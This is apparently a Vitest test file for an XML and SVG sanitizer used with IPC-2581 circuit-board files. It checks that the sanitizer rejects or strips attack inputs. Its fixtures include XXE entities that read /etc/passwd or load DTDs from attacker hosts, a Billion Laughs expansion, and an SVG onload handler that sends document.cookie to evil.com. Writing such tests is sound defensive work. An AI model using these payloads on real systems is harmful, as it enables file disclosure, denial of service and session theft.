import { describe, expect, it } from "vitest";
import {
  assertSafeSvg,
  assertSafeXml,
  sanitizeSvg,
  sanitizeXml,
  XmlSanitizerError,
} from "../../../packages/cloud-core/src/xml-sanitizer.js";

describe("XML XXE & Safe IPC-2581 Parser Guard", () => {
  it("permits standard valid IPC-2581 XML without DTD or entity definitions", () => {
    const validIpc = `<?xml version="1.0" encoding="UTF-8"?>
<IPC-2581 revision="C">
  <Content>
    <Layer name="TOP_COPPER" type="SIGNAL" />
    <Step name="MAIN_BOARD" />
  </Content>
</IPC-2581>`;

    expect(() => assertSafeXml(validIpc)).not.toThrow();
  });

  it("detects and rejects external entity injection (XXE) attacks", () => {
    const xxePayloads = [
      `<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<IPC-2581>&xxe;</IPC-2581>`,
      `<?xml version="1.0"?>
<!DOCTYPE test [ <!ENTITY % sp SYSTEM "http://malicious.example.com/evil.dtd"> %sp; ]>
<root></root>`,
      `<!DOCTYPE data SYSTEM "ftp://attacker.com/data.dtd"><data/>`,
      `<!DOCTYPE data PUBLIC "-//EVIL//DTD" "http://attacker.com/evil.dtd"><data/>`,
    ];

    for (const payload of xxePayloads) {
      expect(() => assertSafeXml(payload)).toThrowError(XmlSanitizerError);
      try {
        assertSafeXml(payload);
      } catch (err) {
        expect((err as XmlSanitizerError).code).toBe("XXE_DETECTED");
      }
    }
  });

  it("detects and rejects Billion Laughs recursive entity expansion attacks", () => {
    const billionLaughs = `<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>`;

    expect(() => assertSafeXml(billionLaughs)).toThrowError(XmlSanitizerError);
    try {
      assertSafeXml(billionLaughs);
    } catch (err) {
      expect((err as XmlSanitizerError).code).toBe("ENTITY_EXPANSION_DETECTED");
    }
  });

  it("sanitizeXml strips DOCTYPE cleanly and leaves safe payload intact", () => {
    const withDoctype = `<?xml version="1.0"?>
<!DOCTYPE board SYSTEM "board.dtd">
<IPC-2581>
  <Design name="Demo" />
</IPC-2581>`;

    const cleaned = sanitizeXml(withDoctype);
    expect(cleaned).not.toContain("<!DOCTYPE");
    expect(cleaned).toContain("<IPC-2581>");
    expect(cleaned).toContain('<Design name="Demo" />');
    expect(() => assertSafeXml(cleaned)).not.toThrow();
  });
});

describe("SVG Script Sanitization & Defense Guard", () => {
  it("preserves valid geometric elements and styling in SVG", () => {
    const validSvg = `<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
  <rect x="10" y="10" width="80" height="80" fill="#0f172a" stroke="#38bdf8" />
  <circle cx="50" cy="50" r="20" fill="#22c55e" />
  <text x="50" y="50" fill="#ffffff" font-size="12">PAD1</text>
</svg>`;

    const result = sanitizeSvg(validSvg);
    expect(result).toContain("<rect");
    expect(result).toContain("<circle");
    expect(result).toContain("<text");
    expect(() => assertSafeSvg(result)).not.toThrow();
  });

  it("strips executable <script> tags and nested contents", () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.cookie);
  </script>
  <circle cx="10" cy="10" r="5" />
</svg>`;

    const sanitized = sanitizeSvg(maliciousSvg);
    expect(sanitized).not.toContain("<script");
    expect(sanitized).not.toContain("alert");
    expect(sanitized).toContain("<circle");
    expect(() => assertSafeSvg(sanitized)).not.toThrow();
  });

  it("strips dangerous <foreignObject> tags", () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="http://evil.com"></iframe>
  </foreignObject>
  <path d="M0 0 L10 10" />
</svg>`;

    const sanitized = sanitizeSvg(maliciousSvg);
    expect(sanitized).not.toContain("<foreignObject");
    expect(sanitized).not.toContain("<iframe");
    expect(sanitized).toContain("<path");
    expect(() => assertSafeSvg(sanitized)).not.toThrow();
  });

  it("strips inline event handler attributes like onload, onerror, onclick", () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://evil.com?c='+document.cookie)">
  <image href="x" onerror="alert(1)" />
  <circle cx="10" cy="10" r="5" onclick="alert(2)" />
</svg>`;

    const sanitized = sanitizeSvg(maliciousSvg);
    expect(sanitized).not.toContain("onload");
    expect(sanitized).not.toContain("onerror");
    expect(sanitized).not.toContain("onclick");
    expect(sanitized).toContain("<svg");
    expect(sanitized).toContain("<image");
    expect(sanitized).toContain("<circle");
    expect(() => assertSafeSvg(sanitized)).not.toThrow();
  });

  it("strips javascript: URIs in href and xlink:href attributes", () => {
    const maliciousSvg = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <a href="javascript:alert(1)"><text>Click me</text></a>
  <a xlink:href="javascript:void(0)"><text>Link</text></a>
</svg>`;

    const sanitized = sanitizeSvg(maliciousSvg);
    expect(sanitized).not.toContain("javascript:");
    expect(sanitized).toContain("<text>Click me</text>");
    expect(() => assertSafeSvg(sanitized)).not.toThrow();
  });

  it("assertSafeSvg throws XmlSanitizerError if unsafe SVG elements remain", () => {
    const rawMalicious = `<svg onload="alert(1)"><circle cx="5" cy="5" r="5"/></svg>`;
    expect(() => assertSafeSvg(rawMalicious)).toThrowError(XmlSanitizerError);
  });

  it("does not let a stripped tag's own fragments recombine into a live one", () => {
    // Removing the inner "<script>...</script>" from "<scr" + "<script>" + "ipt>...</scr" +
    // "</script>" + "ipt>" naively leaves "<scr" + "ipt>", which reads back as "<script>".
    const nested = `<svg><scr<script>ipt>alert(1)</scr</script>ipt></svg>`;
    const sanitized = sanitizeSvg(nested);
    expect(sanitized).not.toContain("<script");
    expect(sanitized).not.toContain("alert(1)");
  });

  it("stays linear time on adversarial unterminated tags (ReDoS guard)", () => {
    const hostile = `<svg>${"<!-- ".repeat(50_000)}${"<script>".repeat(50_000)}`;
    const start = performance.now();
    sanitizeSvg(hostile);
    expect(performance.now() - start).toBeLessThan(1000);
  });
});
